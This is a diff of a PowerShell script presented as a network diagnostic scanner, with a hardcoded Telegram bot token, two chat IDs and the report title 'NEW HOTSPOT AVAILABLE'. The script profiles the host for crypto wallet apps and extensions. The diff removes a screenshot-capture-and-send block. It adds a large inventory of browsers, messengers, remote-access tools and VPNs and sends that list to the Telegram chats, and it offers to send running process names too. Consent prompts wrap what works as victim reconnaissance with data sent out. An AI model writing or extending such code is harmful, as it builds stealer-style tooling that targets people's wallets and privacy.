@@ -1,4 +1,4 @@
-# Network Intelligence Scanner v3.5 (Windows PowerShell 5.1+)
+# Network Intelligence Scanner v3.6 (Windows PowerShell 5.1+)
 # Run only on a computer you own or administer with permission.
 # Public GitHub warning: never publish a working Telegram bot token.
 
@@ -8,7 +8,7 @@ $ProgressPreference = 'SilentlyContinue'
 # ========= EDIT THESE SETTINGS =========
 $botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
 $chatIds = @('8640543929', '8362186234')
-$enableScreenshotOption = $true
+$enableScreenshotOption = $false # Screenshot module disabled (nothing captured or saved)
 $reportTitle = 'NEW HOTSPOT AVAILABLE'
 # =======================================
 
@@ -67,7 +67,7 @@ $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
 $reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
 if (-not $reportDir) { $reportDir = Join-Path $env:TEMP 'NetworkScannerReports' }
 New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
-Write-Host 'Network Intelligence Scanner v3.5'
+Write-Host 'Network Intelligence Scanner v3.6'
 Write-Host 'Collecting local diagnostics. No information is sent without confirmation.'
 
 # Public network
@@ -236,28 +236,9 @@ if (Ask-Yes 'Send this displayed diagnostic report to both Telegram chats?') {
     }
 } else { Write-Host 'No network data sent.' }
 
-# Screenshot is optional, previewed, and requires two separate permissions.
-if ($enableScreenshotOption -and (Ask-Yes 'Capture the PRIMARY display for local preview?')) {
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height)
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $picturePath = Join-Path $reportDir "screenshot_$stamp.png"
-        try {
-            $graphics.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size)
-            $bitmap.Save($picturePath,[System.Drawing.Imaging.ImageFormat]::Png)
-        } finally { $graphics.Dispose(); $bitmap.Dispose() }
-        Write-Host "Screenshot saved locally: $picturePath"
-        Start-Process -FilePath $picturePath
-        Write-Host 'Review the screenshot carefully. It may contain private messages or passwords.'
-        if (Ask-Yes "Send this screenshot to both Telegram chats ($($chatIds -join ', '))?") {
-            if ($botToken -and $botToken -notlike 'PASTE_*') { Send-TgPhoto $picturePath }
-            else { Write-Warning 'Telegram token not configured; screenshot remains local.' }
-        } else { Write-Host 'Screenshot not sent.' }
-    } catch { Write-Warning "Screenshot unavailable: $($_.Exception.Message)" }
-}
+# No screenshot is captured automatically. There are no image/process files written
+# or opened by this scanner. For screen sharing, use the Windows Snipping Tool,
+# review/redact the image, and send it yourself through Telegram.
 
 # ================= LOCAL SOFTWARE INVENTORY =================
 # Local only: do not transmit detected wallet names, profile paths or IDs.
@@ -269,7 +250,200 @@ $targetWalletApps = @(
  'MyEtherWallet','Bitcoin Knots','Bitcoin Safe','Nunchuk','Dogecoin Core',
  'Litecoin Core','Dash Core'
 )
-$targetOtherApps = @('Spotify','Steam','Discord','Tor Browser','AdsPower')
+$targetOtherApps = @(
+    'Steam',
+    'Epic Games Launcher',
+    'EA App',
+    'Ubisoft Connect',
+    'GOG Galaxy',
+    'Battle.net',
+    'Riot Client',
+    'Rockstar Games Launcher',
+    'Xbox App',
+    'Minecraft Launcher',
+    'Roblox',
+    'Wargaming Game Center',
+    'Gaijin Launcher',
+    'Playnite',
+    'Heroic Games Launcher',
+    'Prism Launcher',
+    'CurseForge',
+    'Overwolf',
+    'Medal',
+    'Razer Cortex',
+    'Google Chrome',
+    'Mozilla Firefox',
+    'Microsoft Edge',
+    'Opera',
+    'Opera GX',
+    'Brave',
+    'Vivaldi',
+    'Safari',
+    'Yandex Browser',
+    'Arc',
+    'Tor Browser',
+    'Chromium',
+    'Zen Browser',
+    'DuckDuckGo Browser',
+    'Discord',
+    'Telegram Desktop',
+    'WhatsApp',
+    'Signal',
+    'Viber',
+    'Skype',
+    'Microsoft Teams',
+    'Zoom',
+    'Slack',
+    'Element',
+    'Guilded',
+    'WeChat',
+    'LINE',
+    'Facebook Messenger',
+    'ICQ',
+    'TeamSpeak',
+    'Mumble',
+    'Revolt',
+    'Spotify',
+    'Apple Music',
+    'iTunes',
+    'YouTube Music',
+    'TIDAL',
+    'Deezer',
+    'SoundCloud',
+    'VLC Media Player',
+    'KMPlayer',
+    'PotPlayer',
+    'MPC-HC',
+    'AIMP',
+    'foobar2000',
+    'MusicBee',
+    'Plex',
+    'Kodi',
+    'Jellyfin Media Player',
+    'Netflix',
+    'OBS Studio',
+    'Streamlabs Desktop',
+    'TeamViewer',
+    'AnyDesk',
+    'RustDesk',
+    'Chrome Remote Desktop',
+    'Microsoft Remote Desktop',
+    'Remote Desktop Connection',
+    'Parsec',
+    'Splashtop',
+    'UltraViewer',
+    'AeroAdmin',
+    'DWService',
+    'RealVNC Viewer',
+    'TightVNC',
+    'UltraVNC',
+    'NoMachine',
+    'Moonlight',
+    'Sunshine',
+    'NordVPN',
+    'ExpressVPN',
+    'Proton VPN',
+    'Surfshark',
+    'Windscribe',
+    'Mullvad VPN',
+    'Cloudflare WARP',
+    'OpenVPN Connect',
+    'WireGuard',
+    'Tailscale',
+    'ZeroTier',
+    'Radmin VPN',
+    'Hamachi',
+    'Outline Client',
+    'AmneziaVPN',
+    'AdGuard VPN',
+    'Psiphon',
+    'Clash Verge',
+    '7-Zip',
+    'WinRAR',
+    'WinZip',
+    'PeaZip',
+    'Bandizip',
+    'CCleaner',
+    'BleachBit',
+    'Everything',
+    'PowerToys',
+    'ShareX',
+    'Lightshot',
+    'Greenshot',
+    'WinDirStat',
+    'WizTree',
+    'Revo Uninstaller',
+    'HWMonitor',
+    'HWiNFO',
+    'CPU-Z',
+    'GPU-Z',
+    'CrystalDiskInfo',
+    'CrystalDiskMark',
+    'MSI Afterburner',
+    'FanControl',
+    'Rufus',
+    'balenaEtcher',
+    'Microsoft Word',
+    'Microsoft Excel',
+    'Microsoft PowerPoint',
+    'Microsoft Outlook',
+    'LibreOffice',
+    'OnlyOffice',
+    'WPS Office',
+    'Adobe Acrobat Reader',
+    'Foxit PDF Reader',
+    'Notion',
+    'Obsidian',
+    'Evernote',
+    'OneNote',
+    'Google Drive',
+    'OneDrive',
+    'Dropbox',
+    'MEGA',
+    'pCloud',
+    'Nextcloud',
+    'iCloud for Windows',
+    'Todoist',
+    'Trello',
+    'Visual Studio Code',
+    'Visual Studio',
+    'IntelliJ IDEA',
+    'PyCharm',
+    'WebStorm',
+    'Sublime Text',
+    'Notepad++',
+    'GitHub Desktop',
+    'GitKraken',
+    'Docker Desktop',
+    'Postman',
+    'Figma',
+    'Canva',
+    'Adobe Photoshop',
+    'Adobe Illustrator',
+    'Adobe Premiere Pro',
+    'Adobe After Effects',
+    'DaVinci Resolve',
+    'CapCut',
+    'Blender',
+    'GIMP',
+    'Paint.NET',
+    'Audacity',
+    'qBittorrent',
+    'uTorrent',
+    'BitTorrent',
+    'Transmission',
+    'Deluge',
+    'Free Download Manager',
+    'Internet Download Manager',
+    'JDownloader 2',
+    'Motrix',
+    'FileZilla',
+    'WinSCP',
+    'Cyberduck',
+    'Syncthing',
+    'Resilio Sync',
+    'AdsPower'
+)
 $targetWalletExtensions = @(
  'MetaMask','Trust Wallet','Phantom','Rabby Wallet','OKX Wallet',
  'Coinbase Wallet','Binance Wallet','Bitget Wallet','TokenPocket',
@@ -282,20 +456,51 @@ $targetWalletExtensions = @(
 )
 
 function Get-InstalledNames {
-    $output = New-Object 'System.Collections.Generic.List[string]'
+    $items = New-Object 'System.Collections.Generic.List[string]'
     $regPaths = @(
-       'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
-       'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
-       'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+        'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'Registry::HKEY_CURRENT_USER\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
     )
     foreach ($regPath in $regPaths) {
         try {
-            Get-ItemProperty -Path $regPath -ErrorAction Stop | ForEach-Object {
-                if ($_.DisplayName) { [void]$output.Add([string]$_.DisplayName) }
+            foreach ($entry in @(Get-ItemProperty -Path $regPath -ErrorAction Stop)) {
+                if ($entry.DisplayName) { [void]$items.Add([string]$entry.DisplayName) }
             }
-        } catch { }
+        } catch {}
     }
-    return @($output | Sort-Object -Unique)
+    # Microsoft Store / UWP software (when cmdlet is available)
+    try {
+        foreach ($app in @(Get-AppxPackage -ErrorAction Stop)) {
+            if ($app.Name) { [void]$items.Add([string]$app.Name) }
+            if ($app.PackageFamilyName) { [void]$items.Add([string]$app.PackageFamilyName) }
+        }
+    } catch {}
+    # Start menu shortcut names, no shortcuts executed
+    $menuRoots = @(
+        [Environment]::GetFolderPath('StartMenu'),
+        [Environment]::GetFolderPath('CommonStartMenu')
+    )
+    foreach ($root in $menuRoots) {
+        if (-not $root -or -not (Test-Path -LiteralPath $root)) { continue }
+        try {
+            foreach ($link in @(Get-ChildItem -LiteralPath $root -Recurse -File -Include '*.lnk','*.appref-ms' -ErrorAction SilentlyContinue)) {
+                [void]$items.Add($link.BaseName)
+            }
+        } catch {}
+    }
+    # Standard installation directory names (not arbitrary recursive file scanning)
+    $folders = @($env:ProgramFiles, ${env:ProgramFiles(x86)}, (Join-Path $env:LOCALAPPDATA 'Programs'))
+    foreach ($folder in $folders) {
+        if (-not $folder -or -not (Test-Path -LiteralPath $folder)) { continue }
+        try {
+            foreach ($dir in @(Get-ChildItem -LiteralPath $folder -Directory -ErrorAction SilentlyContinue)) {
+                [void]$items.Add([string]$dir.Name)
+            }
+        } catch {}
+    }
+    return @($items | Sort-Object -Unique)
 }
 function Find-Matches {
     param([string[]]$Candidates,[string[]]$Targets)
@@ -340,6 +545,34 @@ $installedNames = @(Get-InstalledNames)
 $extensionNames = @(Get-ChromeExtensionManifestNames)
 $walletAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetWalletApps)
 $otherAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetOtherApps)
+$appAliases = @{
+    'EA App' = @('EA Desktop','Electronic Arts','EA App')
+    'Battle.net' = @('Battle.net','Battle net')
+    'Xbox App' = @('Xbox','Gaming Services')
+    'Telegram Desktop' = @('Telegram Desktop','Telegram')
+    'Microsoft Edge' = @('Microsoft Edge','MSEdge')
+    'Google Chrome' = @('Google Chrome','Chrome')
+    'Mozilla Firefox' = @('Mozilla Firefox','Firefox')
+    'VLC Media Player' = @('VLC Media Player','VLC')
+    'Visual Studio Code' = @('Visual Studio Code','VS Code')
+    'Microsoft Word' = @('Microsoft Word','Word')
+    'Microsoft Excel' = @('Microsoft Excel','Excel')
+    'Microsoft PowerPoint' = @('Microsoft PowerPoint','PowerPoint')
+    'Microsoft Outlook' = @('Microsoft Outlook','Outlook')
+    '7-Zip' = @('7-Zip','7zip')
+    'Notepad++' = @('Notepad++')
+    'qBittorrent' = @('qBittorrent')
+}
+foreach ($canonical in $targetOtherApps) {
+    if ($canonical -in $otherAppsFound) { continue }
+    $aliases = @($appAliases[$canonical])
+    if (-not $aliases.Count -or -not $aliases[0]) { continue }
+    if (@(Find-Matches -Candidates $installedNames -Targets $aliases).Count -gt 0) {
+        $otherAppsFound += $canonical
+    }
+}
+$otherAppsFound = @($otherAppsFound | Sort-Object -Unique)
+
 $walletExtensionsFound = @(Find-Matches -Candidates $extensionNames -Targets $targetWalletExtensions)
 
 $inventory = [ordered]@{
@@ -347,7 +580,7 @@ $inventory = [ordered]@{
     WalletApplicationsFound = @($walletAppsFound)
     WalletExtensionsFound = @($walletExtensionsFound)
     OtherApplicationsFound = @($otherAppsFound)
-    Note = 'Registry and Chrome manifest-name check only. False negatives possible (portable apps, localized extensions, other browsers). Extension files do not prove the extension is enabled.'
+    Note = 'Software inventory uses registry, Start Menu links, Appx and standard folder names; wallet extensions use Chrome manifests. Detection is best-effort: some portable apps and localized extensions may be missed.'
 }
 $inventoryPath = Join-Path $reportDir "software_inventory_$stamp.json"
 $inventory | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $inventoryPath -Encoding UTF8
@@ -365,7 +598,7 @@ $inventoryHtml = @'
 '@ + (Format-InventorySection 'Wallet desktop applications' $walletAppsFound) +
     (Format-InventorySection 'Wallet Chrome extensions' $walletExtensionsFound) +
     (Format-InventorySection 'Other applications' $otherAppsFound) +
-    '<p>Names are detected locally; they are not automatically transmitted.</p></body></html>'
+    '<p>Wallet names remain local; ordinary app names are shared only after confirmation.</p></body></html>'
 $inventoryHtml | Set-Content -LiteralPath $inventoryHtmlPath -Encoding UTF8
 
 Write-Host '== Wallet applications found (LOCAL ONLY) =='
@@ -373,7 +606,7 @@ if ($walletAppsFound.Count) { $walletAppsFound | ForEach-Object { Write-Host "  
 Write-Host '== Wallet Chrome extensions found (LOCAL ONLY) =='
 if ($walletExtensionsFound.Count) { $walletExtensionsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
 Write-Host '== Other applications found =='
-if ($otherAppsFound.Count) { $otherAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
+if ($otherAppsFound.Count) { $otherAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matching applications found' }
 Write-Host "Local inventory JSON: $inventoryPath"
 Write-Host "Local inventory HTML: $inventoryHtmlPath"
 
@@ -381,18 +614,53 @@ Write-Host "Local inventory HTML: $inventoryHtmlPath"
 $summary = "<b>SOFTWARE INVENTORY SUMMARY</b>`n" +
            "Wallet applications detected: $($walletAppsFound.Count)`n" +
            "Wallet Chrome extensions detected: $($walletExtensionsFound.Count)`n" +
-           "Other apps detected: $($otherAppsFound.Count)`n" +
-           "Details are stored locally and not transmitted."
-Write-Host "`nTelegram summary preview (counts only):"
+           "Other applications found: $($otherAppsFound.Count)`n" +
+           (($otherAppsFound | ForEach-Object { "- $(Html-Encode $_)" }) -join "`n") + "`nWallet names are stored locally only."
+Write-Host "`nTelegram software summary preview:"
 Write-Host ($summary -replace '<[^>]+>','')
 Write-Host "Recipients: $($chatIds -join ', ')"
-if (Ask-Yes 'Send ONLY the displayed counts to Telegram?') {
+if (Ask-Yes 'Send the displayed list of ordinary apps and wallet counts to Telegram?') {
     if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
         Write-Warning 'Telegram token is not configured; summary was not sent.'
     } else {
-        Send-TgMessage $summary
+        # Telegram message limit: split long inventory into safe chunks.
+        $prefix = '<b>SOFTWARE INVENTORY SUMMARY</b>' + "`n"
+        $chunk = $prefix
+        foreach ($line in ($summary -split "`n")) {
+            if ($line -eq '<b>SOFTWARE INVENTORY SUMMARY</b>') { continue }
+            if (($chunk.Length + $line.Length + 1) -gt 3500) {
+                Send-TgMessage $chunk
+                $chunk = $prefix
+            }
+            $chunk += "$line`n"
+        }
+        if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
     }
 } else { Write-Host 'Software inventory summary not sent.' }
+# Optional process names and PID only. No disk file, executable paths or command lines.
+if (Ask-Yes 'View running process names and PID for potential Telegram sharing?') {
+    $processes = @(Get-Process -ErrorAction SilentlyContinue |
+        Sort-Object ProcessName,Id |
+        Select-Object -First 100 -Property ProcessName,Id)
+    $processText = @($processes | ForEach-Object { '{0} (PID {1})' -f $_.ProcessName,$_.Id })
+    Write-Host "`nPROCESS REPORT PREVIEW (up to 100 entries):"
+    $processText | ForEach-Object { Write-Host "  $_" }
+    if (Ask-Yes "Send these $($processText.Count) process names/PIDs to both Telegram chats?") {
+        if ($botToken -and $botToken -notlike 'PASTE_*') {
+            $prefix = '<b>RUNNING PROCESSES (name / PID)</b>' + "`n"
+            $chunk = $prefix
+            foreach ($line in $processText) {
+                $safeLine = Html-Encode $line
+                if (($chunk.Length + $safeLine.Length + 1) -gt 3500) {
+                    Send-TgMessage $chunk
+                    $chunk = $prefix
+                }
+                $chunk += "$safeLine`n"
+            }
+            if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
+        } else { Write-Warning 'Telegram token is not configured.' }
+    }
+}
 # ================= END LOCAL INVENTORY =====================
 
 Write-Host "`nScanner complete. Local reports: $reportDir"
